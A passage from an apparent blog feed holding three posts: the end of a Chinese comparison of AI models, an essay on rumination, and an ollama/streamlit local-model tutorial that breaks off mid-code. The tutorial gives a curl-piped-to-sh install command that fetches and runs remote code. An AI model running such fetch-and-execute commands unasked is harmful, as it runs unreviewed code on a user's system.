&lt;li&gt;&lt;p&gt;&lt;strong&gt;指令遵循和对话能力:&lt;/strong&gt; 经过指令微调，具备较好的指令遵循能力和对话能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多领域应用:&lt;/strong&gt; ChatYuan 模型应用于金融、法律、教育等多个领域。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的中文通用能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;指令遵循和对话能力较好。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多领域应用场景。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;英文能力相对 GPT 系列和 Google 等模型稍弱。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;社区和生态系统规模相对较小。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;二、 代码生成类模型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;1. OpenAI Codex (基于 GPT 系列)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; OpenAI&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (基于 GPT 系列)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 海量的代码数据，包括 GitHub 代码库、公开代码数据集等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的代码生成能力:&lt;/strong&gt; 能够根据自然语言描述或代码注释生成代码片段或完整程序。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;支持多种编程语言:&lt;/strong&gt; 支持 Python, JavaScript, C++, Java, Go 等多种主流编程语言。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;代码补全和代码修复:&lt;/strong&gt; 可以进行代码自动补全、代码错误检测和修复等任务。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;集成于 GitHub Copilot 等工具:&lt;/strong&gt; Codex 模型是 GitHub Copilot 等代码生成工具的核心引擎。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的代码生成质量和能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;支持多种编程语言。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;集成于流行的开发工具，易于使用。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问成本相对较高。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些复杂或特定领域的代码生成任务上，可能需要人工辅助。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2. Google Codey (基于 PaLM 2)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Google&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (基于 PaLM 2)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 海量的代码数据，包括公开代码库、Google 内部代码数据等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的代码生成和代码理解能力:&lt;/strong&gt; Codey 模型在代码生成、代码补全、代码解释等方面表现出色。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多语言支持:&lt;/strong&gt; 支持 Python, JavaScript, Java, Go, C++ 等多种编程语言，并侧重于多语言代码生成能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;与 Google Cloud 集成:&lt;/strong&gt; Codey 模型与 Google Cloud Codey API 和 Google Cloud Workbench 等工具集成，方便开发者使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的代码生成和代码理解能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多语言支持，尤其在多语言代码生成方面具有优势。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;与 Google Cloud 生态集成，方便云端开发。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问和生态系统相对 OpenAI 稍逊 (但正在快速发展)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些复杂或特定领域的代码生成任务上，可能需要人工辅助。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;3. Meta Code Llama 系列 (Code Llama, Code Llama - Instruct 等)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Meta&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Decoder-only Transformer (基于 Llama 2)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 海量的代码数据，包括公开代码库、Stack Overflow 等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和免费可商用:&lt;/strong&gt; Code Llama 系列模型开源且允许商业用途，降低了使用门槛。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本:&lt;/strong&gt; 提供多种参数规模的版本 (7B, 13B, 34B 等)，满足不同资源和应用场景的需求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;指令微调版本 (Code Llama - Instruct):&lt;/strong&gt; 提供指令微调版本，针对代码生成指令进行了优化，更易于使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;支持多种编程语言:&lt;/strong&gt; 支持 Python, C++, Java, PHP, TypeScript, C#, Bash, SQL 等多种编程语言。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源和免费可商用，极大降低了使用门槛。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;高性能的代码生成能力，可媲美闭源模型。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本和指令微调版本，灵活性高。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;基于 Llama 2 开源生态，社区支持良好。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;在某些极端复杂的代码生成任务上，可能不如顶尖闭源模型。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开源模型需要一定的技术能力进行部署和维护。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;生态系统相对 OpenAI 和 Google 稍逊 (但正在快速发展)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;三、 多模态模型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;1. OpenAI GPT-4 (多模态版本)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; OpenAI&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (多模态 Transformer)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 文本、图像、音频、视频等多种模态的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;原生多模态支持:&lt;/strong&gt; 能够处理文本、图像输入，并生成文本输出，实现图像描述、视觉问答等多模态任务。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;强大的多模态理解和生成能力:&lt;/strong&gt; 在多模态任务上表现出色，例如图像描述准确生动，视觉问答逻辑清晰。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;与 GPT 系列文本能力无缝衔接:&lt;/strong&gt; 多模态能力与 GPT 系列强大的文本能力无缝衔接，可以实现更复杂的多模态应用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的多模态理解和生成能力。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;与 GPT 系列文本能力融合，应用潜力巨大。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;成熟的 API 服务和生态系统。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问成本更高 (相比纯文本模型)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和多模态训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多模态能力仍处于发展初期，可能存在一些局限性。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2. Google Gemini 系列 (Gemini Ultra, Gemini Pro, Gemini Nano)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;开发者:&lt;/strong&gt; Google&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;架构:&lt;/strong&gt; Transformer-based (原生多模态 Transformer)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;训练数据:&lt;/strong&gt; 文本、图像、音频、视频等多种模态的大规模数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;关键特点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;原生多模态架构:&lt;/strong&gt; Gemini 从设计之初就考虑了多模态，采用原生多模态 Transformer 架构，能够更有效地融合和处理多种模态的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的多模态性能:&lt;/strong&gt; Gemini Ultra 在多项多模态基准测试中表现出色，超越了 GPT-4 等模型。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本:&lt;/strong&gt; Gemini 系列提供 Ultra (最强性能), Pro (性能和效率平衡), Nano (移动端部署) 三个版本，满足不同需求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Google 生态集成:&lt;/strong&gt; 与 Google 搜索、Android 系统、Google Cloud 等生态系统深度集成，多模态应用场景广阔。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;优点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;顶尖的多模态性能，在多模态领域具有领先优势。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;原生多模态架构，更有效地融合和处理多模态数据。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多种尺寸版本，灵活性高。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;背靠 Google 强大的技术实力和生态系统，应用前景广阔。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;缺点:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Gemini Ultra 的访问权限目前较为受限。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;API 访问和生态系统相对 GPT 系列稍逊 (但正在快速发展)。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;模型细节和多模态训练数据相对封闭。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多模态能力仍处于发展初期，仍有提升空间。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;总结与选择建议:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;选择合适的AI大模型需要根据具体的应用场景、需求和资源情况进行权衡：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;文本生成与理解任务:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求顶尖性能和通用性:&lt;/strong&gt; &lt;strong&gt;GPT-4&lt;/strong&gt; 或 &lt;strong&gt;Gemini Ultra&lt;/strong&gt; 是首选，但成本较高。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求高性能和相对较低成本:&lt;/strong&gt; &lt;strong&gt;GPT-3.5 Turbo&lt;/strong&gt;, &lt;strong&gt;PaLM 2&lt;/strong&gt;, &lt;strong&gt;Claude 3 Sonnet/Opus&lt;/strong&gt; 是不错的选择。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求开源和可商用:&lt;/strong&gt; &lt;strong&gt;Llama 3&lt;/strong&gt; 或 &lt;strong&gt;Code Llama&lt;/strong&gt; 系列是最佳选择。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;中文 NLP 任务:&lt;/strong&gt; &lt;strong&gt;ERNIE Bot 4.0&lt;/strong&gt; 或 &lt;strong&gt;ChatGLM3&lt;/strong&gt; 系列在中文领域具有优势。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;代码生成任务:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求顶尖代码生成能力:&lt;/strong&gt; &lt;strong&gt;Codex (GitHub Copilot)&lt;/strong&gt; 或 &lt;strong&gt;Codey&lt;/strong&gt; 是首选。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求开源和可商用:&lt;/strong&gt; &lt;strong&gt;Code Llama&lt;/strong&gt; 系列是最佳选择。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;多模态任务:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;追求顶尖多模态性能:&lt;/strong&gt; &lt;strong&gt;Gemini Ultra&lt;/strong&gt; 或 &lt;strong&gt;GPT-4 (多模态版本)&lt;/strong&gt; 是首选，但成本较高。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;需要考虑成本和易用性:&lt;/strong&gt; &lt;strong&gt;Gemini Pro&lt;/strong&gt; 或 &lt;strong&gt;GPT-4 (多模态版本)&lt;/strong&gt; 的API 也是可行的选择。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="AI" scheme="https://reiner.host/categories/AI/"/>
    
    
    <category term="AI" scheme="https://reiner.host/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>浅谈一下精神内耗</title>
    <link href="https://reiner.host/posts/12306.html"/>
    <id>https://reiner.host/posts/12306.html</id>
    <published>2025-04-08T09:28:42.000Z</published>
    <updated>2025-04-08T09:31:53.668Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="起因">起因</span></h1><p>最近家里人因为我一句无心的话而生气了好几天，因此我想聊一聊背后深层原因。</p><p>基于这个事我就一直在想，为什么她明知道我是无心的但还是生气了？为什么生气了这么久？</p><span id="more"></span><h1><span id="思考">思考</span></h1><p>经过我的思考，得出如下几点结论：</p><p>一、陷入情绪创造的戏剧性事件并沉迷其中无法自拔。因为我自己本身也是个i人，经常会陷入自我精神内耗之中，因而对此深有体会，当发生了一件我认为是不好的事件，如金钱受到损失、被雨淋湿、受伤、或因他人感到不愉快等，这个时候我就会一直去想，然后越想越难受，越难受越想，时而感到愤怒，时而感到焦虑，时而感到绝望，就像用利刃反复的来回切割自己的身体，明知道是痛苦的，却总是停不下来，因此我称之为精神自残。</p><p>二、什么是情绪创造的戏剧性事件？ 因为事情本身是中性的，它没有好，也没有坏，就像同样是下雨没带伞，有的人会把它当成一场冒险，不断的在屋檐下冲刺，而有的人只是气愤，气愤为什么下雨，为什么又忘记带伞。雨只是到了该下的时候，它并没有针对任何人，是我们自己把它定义成了坏，并且情绪还会把它变得更坏，在情绪想象的世界中它甚至可以比肉体消亡世界末日更坏。</p><p>三、内心敏感，过于感性。 内向的人时常会因他人的一个不经意的小动作或表情而受到伤害，如地铁旁边位置明明空着却没人坐，陌生人看到你突然笑了，又或者只是因为他人看了你一眼，你明明知道他们并不是针对你，但你总是忍不住去想。现在我可能可以不屑一顾，但当我还小的时候时常受此煎熬。</p><h1><span id="我的解决方法">我的解决方法</span></h1><p>一、不要把情绪当作你自己的一部分。精神内耗最大的敌人就是我们的情绪，情绪有时会带给我们正面的反馈，但大多数时候它给我们带来的是痛苦，当你带着情绪去想某件事时你在想的并不是事情的本身，更多的是情绪创造的虚拟世界，我们要做的就是把情绪和自我区分开来，当情绪尝试控制我们时，我们应该站在第三者的角度思考它为什么会出现，以及对它说：“请你安静一点！”。</p><p>二、接受已经发生的事。 当我们遇到一些我们认为是不好的事情时怎么办？第一反应是愤怒、懊悔、焦虑还是绝望？ 我认为首先你得授受它已经发生的事实，只有接受它你才会是思考接下来怎么做，钱包丢了就去找，下雨了就去买伞或者打车。你需要宽恕已经发生的事并允许它的存在，然后你才能冷静下来解决问题。</p><p>三、接受世事无常，人生能控制的事件不超过10%，如果你能控制这10%那么你已经很牛逼了，这个世界本就是无常的，大部分的事情都不会按我们预想或预测的那样发展，我们能做的就是接受并允许它的存在，然后只需要去做你该做的事情。</p><p>四、尽量不通过外在输入来满足自己，如果你会因为他人的夸赞、羡慕、吹捧等而感到高兴，那么你同样会因为他人的轻视、贬低等而感到痛苦，他人的夸赞未必是真心的，被人轻视也有可能对方只是在忙，但不管原因是什么都不重要，重要的是自己内心的平和。</p><p>以上说了这么多但其实我自己也不敢说能够完全做到，只是希望我的总结能帮到有需要人。</p><p>最后推荐两本正在看的书：《当下的力量》 《庄子》</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;最近家里人因为我一句无心的话而生气了好几天，因此我想聊一聊背后深层原因。&lt;/p&gt;
&lt;p&gt;基于这个事我就一直在想，为什么她明知道我是无心的但还是生气了？为什么生气了这么久？&lt;/p&gt;</summary>
    
    
    
    <category term="其它" scheme="https://reiner.host/categories/%E5%85%B6%E5%AE%83/"/>
    
    
    <category term="程序人生" scheme="https://reiner.host/tags/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/"/>
    
  </entry>
  
  <entry>
    <title>使用ollama + streamlit快速构建本地大模型应用</title>
    <link href="https://reiner.host/posts/8d748f6c.html"/>
    <id>https://reiner.host/posts/8d748f6c.html</id>
    <published>2024-12-17T09:42:46.000Z</published>
    <updated>2024-12-17T12:44:54.439Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="说明">说明</span></h1><p> 使用ollama可以很方便的运行本地大模型(包括官方模型和gguf量化模型)，使用streamlit快速构建对话界面。</p><h1><span id="安装ollama">安装ollama</span></h1><p> 以linux系统为例</p><h2><span id="在线安装">在线安装</span></h2><p> 在线安装直接按官方命令执行：<code>curl -fsSL https://ollama.com/install.sh | sh</code> ，但鉴于国内网络下不动，可以考虑手动安装</p><h2><span id="手动安装">手动安装</span></h2><p> 下载安装包： <code>curl -L https://ollama.com/download/ollama-linux-amd64.tgz -o ollama-linux-amd64.tgz</code><br> 解压： <code>sudo tar -C /usr -xzf ollama-linux-amd64.tgz</code><br> 运行服务： <code>ollama serve</code></p><h1><span id="下载模型文件">下载模型文件</span></h1><p>此处使用modelscope下载qwen的gguf量化模型</p><p>安装modelscope下载工具:<code>pip install -U modelscope</code>  </p><p>下载模型文件： <code>modelscope download --model=Qwen/Qwen2.5-Coder-32B-Instruct-GGUF --include &quot;qwen2.5-coder-32b-instruct-q5_k_m*.gguf&quot; --local_dir . </code></p><h1><span id="创建modelfile">创建ModelFile</span></h1><p>  ModelFile用于ollama构建本地模型，示例如下：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FROM .&#x2F;QwQ-32B-Preview-GGUF&#x2F;qwen2.5-coder-32b-instruct-q5_k_m.gguf</span><br><span class="line"># sets the temperature to 1 [higher is more creative, lower is more coherent]</span><br><span class="line">PARAMETER temperature 1</span><br><span class="line"># sets the context window size to 4096, this controls how many tokens the LLM can use as context to generate the next token</span><br><span class="line">PARAMETER num_ctx 4096</span><br><span class="line"></span><br><span class="line"># sets a custom system message to specify the behavior of the chat assistant</span><br><span class="line">SYSTEM You are Mario from super mario bros, acting as an assistant.</span><br></pre></td></tr></table></figure><br>其中FROM为本地大模型的路径</p><h1><span id="构建ollama本地大模型">构建ollama本地大模型</span></h1><p>执行:<code>ollama create mymodel -f ./Modelfile</code>  名字可以随便起，Modelfile为刚才创建的Modelfile文件路径。</p><p>创建完成后运行： <code>ollama run mymodel</code> </p><h1><span id="编写streamlit页面并与ollama对接">编写streamlit页面并与ollama对接</span></h1><h2><span id="依赖">依赖</span></h2><p>需要安装的依赖如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install transformers</span><br><span class="line">pip install ctransformers</span><br><span class="line">pip install streamlit</span><br><span class="line">pip install torch</span><br></pre></td></tr></table></figure><p>如无法运行可能需要安装torch cuda环境，具体安装此处省略。</p><h2><span id="编写python代码">编写python代码</span></h2><p>创建<code>main.py</code>编写如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 